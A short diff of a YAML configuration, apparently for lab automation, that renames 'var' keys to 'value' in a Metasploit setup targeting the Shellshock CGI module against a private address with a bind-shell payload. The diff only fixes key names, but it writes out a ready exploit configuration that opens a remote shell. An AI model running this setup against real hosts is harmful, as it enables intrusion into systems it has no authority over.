@@ -7,8 +7,8 @@ metasploit:
     module_name: exploit/multi/http/apache_mod_cgi_bash_env_exec
     options:
       - name: RHOST
-        var: 192.168.177.177
+        value: 192.168.177.177
       - name: TARGETURI
-        var: http://192.168.177.177/cgi-bin/test.cgi
+        value: http://192.168.177.177/cgi-bin/test.cgi
       - name: PAYLOAD
-        var: linux/x86/shell_bind_tcp
+        value: linux/x86/shell_bind_tcp
